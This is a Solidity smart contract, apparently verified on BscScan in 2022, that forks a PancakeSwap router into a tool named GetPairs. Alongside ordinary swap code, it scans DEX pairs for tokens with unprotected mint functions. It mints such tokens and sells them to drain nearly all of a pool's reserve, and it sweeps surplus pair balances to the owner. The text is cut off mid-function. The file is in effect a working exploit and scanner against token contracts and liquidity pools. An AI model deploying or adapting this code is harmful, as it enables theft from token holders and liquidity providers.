/**
 *Submitted for verification at BscScan.com on 2022-11-11
*/

pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;
// helper methods for interacting with ERC20 tokens and sending ETH that do not consistently return true/false
library TransferHelper {
    function safeApprove(address token, address to, uint value) internal {
        // bytes4(keccak256(bytes('approve(address,uint256)')));
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x095ea7b3, to, value));
        require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: APPROVE_FAILED');
    }

    function safeTransfer(address token, address to, uint value) internal {
        // bytes4(keccak256(bytes('transfer(address,uint256)')));
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0xa9059cbb, to, value));
        require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: TRANSFER_FAILED');
    }

    function safeTransferFrom(address token, address from, address to, uint value) internal {
        // bytes4(keccak256(bytes('transferFrom(address,address,uint256)')));
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x23b872dd, from, to, value));
        require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: TRANSFER_FROM_FAILED');
    }

    function safeTransferETH(address to, uint value) internal {
        (bool success,) = to.call{value:value}(new bytes(0));
        require(success, 'TransferHelper: ETH_TRANSFER_FAILED');
    }
}

// File: contracts\interfaces\IPancakeRouter01.sol

pragma solidity >=0.6.2;

interface IPancakeRouter01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
    external
    payable
    returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
    external
    returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
    external
    returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
    external
    payable
    returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

// File: contracts\interfaces\IPancakeRouter02.sol

pragma solidity >=0.6.2;

interface IPancakeRouter02 is IPancakeRouter01 {

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

// File: contracts\interfaces\IPancakeFactory.sol

pragma solidity >=0.5.0;

interface IPancakeFactory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;

    function INIT_CODE_PAIR_HASH() external view returns (bytes32);
}

// File: contracts\libraries\SafeMath.sol

pragma solidity =0.6.6;

// a library for performing overflow-safe math, courtesy of DappHub (https://github.com/dapphub/ds-math)

library SafeMath {
    function add(uint x, uint y) internal pure returns (uint z) {
        require((z = x + y) >= x, 'ds-math-add-overflow');
    }

    function sub(uint x, uint y) internal pure returns (uint z) {
        require((z = x - y) <= x, 'ds-math-sub-underflow');
    }

    function mul(uint x, uint y) internal pure returns (uint z) {
        require(y == 0 || (z = x * y) / y == x, 'ds-math-mul-overflow');
    }
}

// File: contracts\interfaces\IPancakePair.sol

pragma solidity >=0.5.0;

interface IPancakePair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;

    event Mint(address indexed sender, uint amount0, uint amount1);
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);

    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;

    function initialize(address, address) external;
}

// File: contracts\libraries\PancakeLibrary.sol

pragma solidity >=0.5.0;



library PancakeLibrary {
    using SafeMath for uint;

    // returns sorted token addresses, used to handle return values from pairs sorted in this order
    function sortTokens(address tokenA, address tokenB) internal pure returns (address token0, address token1) {
        require(tokenA != tokenB, 'PancakeLibrary: IDENTICAL_ADDRESSES');
        (token0, token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);
        require(token0 != address(0), 'PancakeLibrary: ZERO_ADDRESS');
    }
	
	//bscTest
    //calculates the CREATE2 address for a pair without making any external calls
    function pairFor(address factory, address tokenA, address tokenB) internal pure returns (address pair) {
       (address token0, address token1) = sortTokens(tokenA, tokenB);
       pair = address(uint(keccak256(abi.encodePacked(
               hex'ff',
               factory,
               keccak256(abi.encodePacked(token0, token1)),
               hex'ecba335299a6693cb2ebc4782e74669b84290b6378ea3a3873c7231a8d7d1074' // init code hash
           ))));
    }
	
	// bscMain
    // function pairFor(address factory, address tokenA, address tokenB) internal pure returns (address pair) {
    //     (address token0, address token1) = sortTokens(tokenA, tokenB);
    //     pair = address(uint(keccak256(abi.encodePacked(
    //             hex'ff',
    //             factory,
    //             keccak256(abi.encodePacked(token0, token1)),
    //             hex'00fb7f630766e6a796048ea87d01acd3068e8ff67d078148a3fa3f4a84f69bd5' // init code hash
    //         ))));
    // }	

    // Heco
    // function pairFor(address factory, address tokenA, address tokenB) internal pure returns (address pair) {
    //     (address token0, address token1) = sortTokens(tokenA, tokenB);
    //     pair = address(uint(keccak256(abi.encodePacked(
    //             hex'ff',
    //             factory,
    //             keccak256(abi.encodePacked(token0, token1)),
    //             hex'2ad889f82040abccb2649ea6a874796c1601fb67f91a747a80e08860c73ddf24' // init code hash
    //         ))));
    // }	
	

    // fetches and sorts the reserves for a pair
    function getReserves(address factory, address tokenA, address tokenB) internal view returns (uint reserveA, uint reserveB) {
        (address token0,) = sortTokens(tokenA, tokenB);
        pairFor(factory, tokenA, tokenB);
        (uint reserve0, uint reserve1,) = IPancakePair(pairFor(factory, tokenA, tokenB)).getReserves();
        (reserveA, reserveB) = tokenA == token0 ? (reserve0, reserve1) : (reserve1, reserve0);
    }

    // given some amount of an asset and pair reserves, returns an equivalent amount of the other asset
    function quote(uint amountA, uint reserveA, uint reserveB) internal pure returns (uint amountB) {
        require(amountA > 0, 'PancakeLibrary: INSUFFICIENT_AMOUNT');
        require(reserveA > 0 && reserveB > 0, 'PancakeLibrary: INSUFFICIENT_LIQUIDITY');
        amountB = amountA.mul(reserveB) / reserveA;
    }

    // given an input amount of an asset and pair reserves, returns the maximum output amount of the other asset
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) internal pure returns (uint amountOut) {
        require(amountIn > 0, 'PancakeLibrary: INSUFFICIENT_INPUT_AMOUNT');
        require(reserveIn > 0 && reserveOut > 0, 'PancakeLibrary: INSUFFICIENT_LIQUIDITY');
        uint amountInWithFee = amountIn.mul(9975);
        uint numerator = amountInWithFee.mul(reserveOut);
        uint denominator = reserveIn.mul(10000).add(amountInWithFee);
        amountOut = numerator / denominator;
    }

    // given an output amount of an asset and pair reserves, returns a required input amount of the other asset
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) internal pure returns (uint amountIn) {
        require(amountOut > 0, 'PancakeLibrary: INSUFFICIENT_OUTPUT_AMOUNT[AI]');
        require(reserveIn > 0 && reserveOut > 0, 'PancakeLibrary: INSUFFICIENT_LIQUIDITY');
        uint numerator = reserveIn.mul(amountOut).mul(10000);
        uint denominator = reserveOut.sub(amountOut).mul(9975);
        amountIn = (numerator / denominator).add(1);
    }

    // performs chained getAmountOut calculations on any number of pairs
    function getAmountsOut(address factory, uint amountIn, address[] memory path) internal view returns (uint[] memory amounts) {
        require(path.length >= 2, 'PancakeLibrary: INVALID_PATH');
        amounts = new uint[](path.length);
        amounts[0] = amountIn;
        for (uint i; i < path.length - 1; i++) {
            (uint reserveIn, uint reserveOut) = getReserves(factory, path[i], path[i + 1]);
            amounts[i + 1] = getAmountOut(amounts[i], reserveIn, reserveOut);
        }
    }

    // performs chained getAmountIn calculations on any number of pairs
    function getAmountsIn(address factory, uint amountOut, address[] memory path) internal view returns (uint[] memory amounts) {
        require(path.length >= 2, 'PancakeLibrary: INVALID_PATH');
        amounts = new uint[](path.length);
        amounts[amounts.length - 1] = amountOut;
        for (uint i = path.length - 1; i > 0; i--) {
            (uint reserveIn, uint reserveOut) = getReserves(factory, path[i - 1], path[i]);
            amounts[i - 1] = getAmountIn(amounts[i], reserveIn, reserveOut);
        }
    }
}

// File: contracts\interfaces\IERC20.sol

pragma solidity >=0.5.0;

interface IERC20 {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);
}

// File: contracts\interfaces\IWETH.sol

pragma solidity >=0.5.0;

interface IWETH {
    function deposit() external payable;
    function transfer(address to, uint value) external returns (bool);
    function withdraw(uint) external;
}


// File: contracts\PancakeRouter.sol

pragma solidity =0.6.6;


abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal pure virtual returns (bytes memory) {
        return msg.data;
    }
}

abstract contract Ownable is Context {

	mapping(address => bool) public manager;

    event OwnershipTransferred(address indexed newOwner, bool isManager);


    constructor() public{
        _setOwner(address(0),true);
        _setOwner(_msgSender(), true);
    }

    modifier onlyOwner() {
        require(manager[_msgSender()], "Ownable: caller is not the owner");
        _;
    }

    function setOwner(address newOwner,bool isManager) public virtual onlyOwner {
        _setOwner(newOwner,isManager);
    }

    function _setOwner(address newOwner, bool isManager) private {
        manager[newOwner] = isManager;
        emit OwnershipTransferred(newOwner, isManager);
    }
}

contract GetPairs is IPancakeRouter02, Ownable{
    using SafeMath for uint;

    address public  override factory;
    address public  override WETH;
    IPancakeRouter02 public pancakeRouter;
    mapping(address => bool)public ultimate;

    modifier ensure(uint deadline) {
        require(deadline >= block.timestamp, 'PancakeRouter: EXPIRED');
        _;
    }

    constructor() public {
        
        // // bscMain
		// updatePancakeRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E,
        //                     0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73,
        //                     0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
        ultimate[0x55d398326f99059fF775485246999027B3197955] = true;
        ultimate[0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c] = true;
        ultimate[0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56] = true;
        ultimate[0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3] = true;
        ultimate[0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82] = true;

        // bscTest
		updatePancakeRouter(0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3,
                            0xB7926C0430Afb07AA7DEfDE6DA862aE0Bde767bc,
                            0xae13d989daC2f0dEbFf460aC112a837C89BAa7cd);
        
        //heco

        // updatePancakeRouter(0x0f1c2D1FDD202768A4bDa7A38EB0377BD58d278E,
        //                     0xb0b670fc1F7724119963018DB0BfA86aDb22d941,
        //                     0x5545153CCFcA01fbd7Dd11C0b23ba694D9509A6F);
        

    }


    function setUltimate(address token, bool stauts)public onlyOwner{
        ultimate[token] = stauts;
    }

     function updatePancakeRouter(address newRouter,address newFactory,address newWETH) public onlyOwner {
        pancakeRouter = IPancakeRouter02(newRouter);
        factory =   newFactory;
        WETH    = newWETH;
    }
    
    // **** SWAP ****
    // requires the initial amount to have already been sent to the first pair
    function _swap(uint[] memory amounts, address[] memory path, address _to) internal virtual {
        for (uint i; i < path.length - 1; i++) {
            (address input, address output) = (path[i], path[i + 1]);
            (address token0,) = PancakeLibrary.sortTokens(input, output);
            uint amountOut = amounts[i + 1];
            (uint amount0Out, uint amount1Out) = input == token0 ? (uint(0), amountOut) : (amountOut, uint(0));
            address to = i < path.length - 2 ? PancakeLibrary.pairFor(factory, output, path[i + 2]) : _to;
            IPancakePair(PancakeLibrary.pairFor(factory, input, output)).swap(
                amount0Out, amount1Out, to, new bytes(0)
            );
        }
    }
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external virtual override onlyOwner ensure(deadline) returns (uint[] memory amounts) {
        amounts = PancakeLibrary.getAmountsOut(factory, amountIn, path);
        require(amounts[amounts.length - 1] >= amountOutMin, 'PancakeRouter: INSUFFICIENT_OUTPUT_AMOUNT[E_T_F_T]');
        TransferHelper.safeTransferFrom(
            path[0], msg.sender, PancakeLibrary.pairFor(factory, path[0], path[1]), amounts[0]
        );
        _swap(amounts, path, to);
    }
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external virtual override onlyOwner ensure(deadline) returns (uint[] memory amounts) {
        amounts = PancakeLibrary.getAmountsIn(factory, amountOut, path);
        require(amounts[0] <= amountInMax, 'PancakeRouter: EXCESSIVE_INPUT_AMOUNT');
        TransferHelper.safeTransferFrom(
            path[0], msg.sender, PancakeLibrary.pairFor(factory, path[0], path[1]), amounts[0]
        );
        _swap(amounts, path, to);
    }
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
    external
    virtual
    override
    payable
    onlyOwner
    ensure(deadline)
    returns (uint[] memory amounts)
    {
        require(path[0] == WETH, 'PancakeRouter: INVALID_PATH');
        amounts = PancakeLibrary.getAmountsOut(factory, msg.value, path);
        require(amounts[amounts.length - 1] >= amountOutMin, 'PancakeRouter: INSUFFICIENT_OUTPUT_AMOUNT[E_E_F_T]');
        IWETH(WETH).deposit{value: amounts[0]}();
        assert(IWETH(WETH).transfer(PancakeLibrary.pairFor(factory, path[0], path[1]), amounts[0]));
        _swap(amounts, path, to);
    }
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
    external
    virtual
    override
    onlyOwner
    ensure(deadline)
    returns (uint[] memory amounts)
    {
        require(path[path.length - 1] == WETH, 'PancakeRouter: INVALID_PATH');
        amounts = PancakeLibrary.getAmountsIn(factory, amountOut, path);
        require(amounts[0] <= amountInMax, 'PancakeRouter: EXCESSIVE_INPUT_AMOUNT');
        TransferHelper.safeTransferFrom(
            path[0], msg.sender, PancakeLibrary.pairFor(factory, path[0], path[1]), amounts[0]
        );
        _swap(amounts, path, address(this));
        IWETH(WETH).withdraw(amounts[amounts.length - 1]);
        TransferHelper.safeTransferETH(to, amounts[amounts.length - 1]);
    }
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
    external
    virtual
    override
    onlyOwner
    ensure(deadline)
    returns (uint[] memory amounts)
    {
        require(path[path.length - 1] == WETH, 'PancakeRouter: INVALID_PATH');
        amounts = PancakeLibrary.getAmountsOut(factory, amountIn, path);
        require(amounts[amounts.length - 1] >= amountOutMin, 'PancakeRouter: INSUFFICIENT_OUTPUT_AMOUNT[E_T_F_E]');
        TransferHelper.safeTransferFrom(
            path[0], msg.sender, PancakeLibrary.pairFor(factory, path[0], path[1]), amounts[0]
        );
        _swap(amounts, path, address(this));
        IWETH(WETH).withdraw(amounts[amounts.length - 1]);
        TransferHelper.safeTransferETH(to, amounts[amounts.length - 1]);
    }
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
    external
    virtual
    override
    payable
    onlyOwner
    ensure(deadline)
    returns (uint[] memory amounts)
    {
        require(path[0] == WETH, 'PancakeRouter: INVALID_PATH');
        amounts = PancakeLibrary.getAmountsIn(factory, amountOut, path);
        require(amounts[0] <= msg.value, 'PancakeRouter: EXCESSIVE_INPUT_AMOUNT');
        IWETH(WETH).deposit{value: amounts[0]}();
        assert(IWETH(WETH).transfer(PancakeLibrary.pairFor(factory, path[0], path[1]), amounts[0]));
        _swap(amounts, path, to);
        // refund dust eth, if any
        if (msg.value > amounts[0]) TransferHelper.safeTransferETH(msg.sender, msg.value - amounts[0]);
    }

    // **** SWAP (supporting fee-on-transfer tokens) ****
    // requires the initial amount to have already been sent to the first pair
    function _swapSupportingFeeOnTransferTokens(address[] memory path, address _to) internal virtual {
        for (uint i; i < path.length - 1; i++) {
            (address input, address output) = (path[i], path[i + 1]);
            (address token0,) = PancakeLibrary.sortTokens(input, output);
            IPancakePair pair = IPancakePair(PancakeLibrary.pairFor(factory, input, output));
            uint amountInput;
            uint amountOutput;
            { // scope to avoid stack too deep errors
                (uint reserve0, uint reserve1,) = pair.getReserves();
                (uint reserveInput, uint reserveOutput) = input == token0 ? (reserve0, reserve1) : (reserve1, reserve0);
                amountInput = IERC20(input).balanceOf(address(pair)).sub(reserveInput);
                amountOutput = PancakeLibrary.getAmountOut(amountInput, reserveInput, reserveOutput);
            }
            (uint amount0Out, uint amount1Out) = input == token0 ? (uint(0), amountOutput) : (amountOutput, uint(0));
            address to = i < path.length - 2 ? PancakeLibrary.pairFor(factory, output, path[i + 2]) : _to;
            pair.swap(amount0Out, amount1Out, to, new bytes(0));
        }
    }
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external virtual override onlyOwner ensure(deadline) {
        TransferHelper.safeTransferFrom(
            path[0], msg.sender, PancakeLibrary.pairFor(factory, path[0], path[1]), amountIn
        );
        uint balanceBefore = IERC20(path[path.length - 1]).balanceOf(to);
        _swapSupportingFeeOnTransferTokens(path, to);
        require(
            IERC20(path[path.length - 1]).balanceOf(to).sub(balanceBefore) >= amountOutMin,
            'PancakeRouter: INSUFFICIENT_OUTPUT_AMOUNT[E_T_F_T.]'
        );
    }
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    )
    external
    virtual
    override
    payable
    onlyOwner
    ensure(deadline)
    {
        require(path[0] == WETH, 'PancakeRouter: INVALID_PATH');
        uint amountIn = msg.value;
        IWETH(WETH).deposit{value: amountIn}();
        assert(IWETH(WETH).transfer(PancakeLibrary.pairFor(factory, path[0], path[1]), amountIn));
        uint balanceBefore = IERC20(path[path.length - 1]).balanceOf(to);
        _swapSupportingFeeOnTransferTokens(path, to);
        require(
            IERC20(path[path.length - 1]).balanceOf(to).sub(balanceBefore) >= amountOutMin,
            'PancakeRouter: INSUFFICIENT_OUTPUT_AMOUNT[E_T_F_T.]'
        );
    }
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    )
    external
    virtual
    override
    onlyOwner
    ensure(deadline)
    {
        require(path[path.length - 1] == WETH, 'PancakeRouter: INVALID_PATH');
        TransferHelper.safeTransferFrom(
            path[0], msg.sender, PancakeLibrary.pairFor(factory, path[0], path[1]), amountIn
        );
        _swapSupportingFeeOnTransferTokens(path, address(this));
        uint amountOut = IERC20(WETH).balanceOf(address(this));
        require(amountOut >= amountOutMin, 'PancakeRouter: INSUFFICIENT_OUTPUT_AMOUNT[E_T_F_E.]');
        IWETH(WETH).withdraw(amountOut);
        TransferHelper.safeTransferETH(to, amountOut);
    }

    // **** LIBRARY FUNCTIONS ****
    function quote(uint amountA, uint reserveA, uint reserveB) public pure virtual override returns (uint amountB) {
        return PancakeLibrary.quote(amountA, reserveA, reserveB);
    }

    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut)
    public
    pure
    virtual
    override
    returns (uint amountOut)
    {
        return PancakeLibrary.getAmountOut(amountIn, reserveIn, reserveOut);
    }

    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut)
    public
    pure
    virtual
    override
    returns (uint amountIn)
    {
        return PancakeLibrary.getAmountIn(amountOut, reserveIn, reserveOut);
    }

    function getAmountsOut(uint amountIn, address[] memory path)
    public
    view
    virtual
    override
    returns (uint[] memory amounts)
    {
        return PancakeLibrary.getAmountsOut(factory, amountIn, path);
    }

    function getAmountsIn(uint amountOut, address[] memory path)
    public
    view
    virtual
    override
    returns (uint[] memory amounts)
    {
        return PancakeLibrary.getAmountsIn(factory, amountOut, path);
    }

	

    function sellTokenForRate(address[] memory path, uint rate ,uint deadline)
    public
    onlyOwner
    ensure(deadline) returns (uint256,uint256){
	
		uint balace = IERC20(path[1]).balanceOf(msg.sender);
        uint amountIn = IERC20(path[0]).balanceOf(address(this)) * rate / 10000;

        require(amountIn > 0, 'Super clip: no tokens to sell');

        TransferHelper.safeTransfer(
        path[0], PancakeLibrary.pairFor(factory, path[0], path[1]), amountIn
        );
       
        _swapSupportingFeeOnTransferTokens(path, msg.sender);

        return (amountIn, IERC20(path[1]).balanceOf(msg.sender).sub(balace));
        
    }

	
    function withdrawStuckTokensTwo(address token, uint256 amount) public onlyOwner {
        if(token == address(0)){
            payable(msg.sender).transfer(address(this).balance);
        }
       IERC20(token).transfer(msg.sender, amount);
	}

	
	receive() external payable {}

  

    struct pairInfo{
        uint256 pairId;
		address pancakePair;
		address token0;
		address token1;
		uint256 balance0;
		uint256 balance1;
		uint256 decimals0;
		uint256 decimals1;	
        uint256 token0Mint;
        uint256 token1Mint;	
        uint256 reserve0;
        uint256 reserve1;
        uint256 blockTimestampLast;
	}

    function balanceOfCall(address token, address user)public returns(bool,uint256){
      
       (bool success,) = token.call(abi.encodeWithSelector(bytes4(keccak256(bytes('balanceOf(address)'))), user));
        if(success){
            return (success,IERC20(token).balanceOf(user));
        }
        return (success,0);
    }
	

    struct isMintInfo{       
		address tokenAddress;
		uint256 isMint;
        uint256 lastBlance;
	}

    function checkMintAmount(address token, uint256 amount)public returns(address,uint256,uint256){
		(bool success, uint256 blance ) = balanceOfCall(token,address(this));
        if(!success){
            return  (token,0,0) ;
        }
        uint256 isMint = 0;
        uint256 lastBlance;
       (bool success1,) = token.call(abi.encodeWithSelector(bytes4(keccak256(bytes('mint(uint256)'))), amount));
       
       if(success1){
           (,  lastBlance ) = balanceOfCall(token,address(this));
           if(lastBlance.sub(blance) == amount){
               isMint = 1;
           }
		    
	   }
       
       if(isMint == 0){
            (bool success2,) = token.call(abi.encodeWithSelector(bytes4(keccak256(bytes('mint(address,uint256)'))), address(this), amount));
            
            if(success2){
                (,  lastBlance ) = balanceOfCall(token,address(this));
                if(lastBlance.sub(blance) == amount){
                    isMint = 2;
                }
                    
            }
        }
	   return (token,isMint,lastBlance);
    }

    function batchCheckMintAmount(address[] memory tokens , uint256[] memory amount)public returns(isMintInfo[] memory){
        uint256 length = tokens.length;
        isMintInfo[] memory tokenMints = new isMintInfo[](length);

        for(uint256 i = 0 ; i< length; i++){
            (tokenMints[i].tokenAddress, tokenMints[i].isMint, tokenMints[i].lastBlance) = checkMintAmount(tokens[i], amount[i]);
        }
        return tokenMints;

    }

    function getPairsForIds(uint256 start, uint256 end)public returns(pairInfo[] memory){
		uint256 maxEnd = IPancakeFactory(pancakeRouter.factory()). allPairsLength().sub(1);
        if(start > maxEnd){
            start = maxEnd;
        }
        if(end > maxEnd){
            end = maxEnd;
        }
        uint256 length = end.sub(start);
		pairInfo[] memory pairs = new pairInfo[](length+1);
		
		for(uint256 i = 0; i <= length; i++){
            pairs[i].pairId = start + i;
			pairs[i].pancakePair = IPancakeFactory(pancakeRouter.factory()).allPairs(start + i);
			pairs[i].token0 = IPancakePair(pairs[i].pancakePair).token0();
			pairs[i].token1 = IPancakePair(pairs[i].pancakePair).token1();
            (pairs[i].reserve0,pairs[i].reserve1,pairs[i].blockTimestampLast) = IPancakePair(pairs[i].pancakePair).getReserves();

            (bool success0, uint256 blance0 ) = balanceOfCall(pairs[i].token0,pairs[i].pancakePair);
            if(success0){
                pairs[i].balance0 = blance0;
                pairs[i].decimals0 = IERC20(pairs[i].token0).decimals();
            }

            (bool success1, uint256 blance1 ) = balanceOfCall(pairs[i].token1,pairs[i].pancakePair);
            if(success1){
                pairs[i].balance1 = blance1;
                pairs[i].decimals1 = IERC20(pairs[i].token1).decimals();
            }

            ( , pairs[i].token0Mint,) = checkMintAmount(pairs[i].token0,10000 * 10 ** 18);
            ( , pairs[i].token1Mint,) = checkMintAmount(pairs[i].token1,10000 * 10 ** 18);
		}

        return pairs;
    }

    function getPairsForAddress(address pancakePair)public returns(pairInfo memory pairRes){
		
        pairRes.pancakePair = pancakePair;
        pairRes.token0 = IPancakePair(pairRes.pancakePair).token0();
        pairRes.token1 = IPancakePair(pairRes.pancakePair).token1();
        (pairRes.reserve0,pairRes.reserve1,pairRes.blockTimestampLast) = IPancakePair(pairRes.pancakePair).getReserves();

        (bool success0, uint256 blance0 ) = balanceOfCall(pairRes.token0,pairRes.pancakePair);
        if(success0){
            pairRes.balance0 = blance0;
            pairRes.decimals0 = IERC20(pairRes.token0).decimals();
        }

        (bool success1, uint256 blance1 ) = balanceOfCall(pairRes.token1,pairRes.pancakePair);
        if(success1){
            pairRes.balance1 = blance1;
            pairRes.decimals1 = IERC20(pairRes.token1).decimals();
        }

        ( , pairRes.token0Mint,) = checkMintAmount(pairRes.token0,10000 * 10 ** 18);
        ( , pairRes.token1Mint,) = checkMintAmount(pairRes.token1,10000 * 10 ** 18);
    }

    function batchGetPairsForAddress(address[] memory pancakePairArr)public  returns(pairInfo[] memory){
        uint256 length = pancakePairArr.length;
        pairInfo[] memory pairs = new pairInfo[](length);
        for(uint256 i = 0; i < length; i++){
            pairs[i] = getPairsForAddress(pancakePairArr[i]);
        }
        return pairs;
    }


    
    function MintAndSellToken(address pair, address token,uint256 rate)public  returns(uint256,uint256){
        address token0 = IPancakePair(pair).token0();
		address token1 = IPancakePair(pair).token1();

        address[] memory path = new address[](2);
        if(token0 == token){          
            
            path[0] = token0;
            path[1] = token1;


        }else{
            path[0] = token1;
            path[1] = token0;
        }
        
        uint256 toValue = IERC20(path[1]).balanceOf(pair);
        uint256 FromValue = IERC20(path[0]).balanceOf(pair);
        uint256 needFromValue =  PancakeLibrary.getAmountIn((toValue * 9999)/10000, FromValue , toValue);
        checkMintAmount(path[0],needFromValue);
        return sellTokenForRate(path,rate,block.timestamp);

    }



    function excessAndSellForPair(address pairAddress)public returns(uint256,uint256){
        pairInfo memory pairRes = getPairsForAddress(pairAddress);

        address[] memory path0 = new address[](2);
        path0[0] = pairRes.token0;
        path0[1] = pairRes.token1;

        address[] memory path1 = new address[](2);
        path1[0] = pairRes.token1;
        path1[1] = pairRes.token0;

        if(pairRes.balance0 > pairRes.reserve0){
           return (pairRes.balance0.sub(pairRes.reserve0), excessAndSellForPath(path0));
        }
   
        if(pairRes.balance1 > pairRes.reserve1){
            return (pairRes.balance1.sub(pairRes.reserve1), excessAndSellForPath(path1));
        }

        return (0,0);
    }

    function excessAndSellForPath(address[] memory path)public onlyOwner returns(uint256){
        uint256 balance = IERC20(path[1]).balanceOf(address(this));
        _swapSupportingFeeOnTransferTokens(path,address(this));
        uint256 profit = IERC20(path[1]).balanceOf(address(this)).sub(balance);

        if(ultimate[ path[1] ] ){
            IERC20(path[1]).transfer(msg.sender,profit);
            
        }else{
            
            address[] memory reversePath = new address[](2);
            reversePath[0] = path[1];
            reversePath[1] = path[0];

            balance = IERC20(reversePath[1]).balanceOf(msg.sender);
            TransferHelper.safeTransfer(
            reversePath[0], PancakeLibrary.pairFor(factory, reversePath[0], reversePath[1]), profit);
            _swapSupportingFeeOnTransferTokens(reversePath, msg.sender);
            profit =  IERC20(reversePath[1]).balanceOf(msg.sender).sub(balance);
        }

        return profit;

    }

    function batchExcessAndSellForPair(address[] memory pairs)public onlyOwner returns(uint256[] memory, uint256[] memory){
        uint256 length = pairs.length;
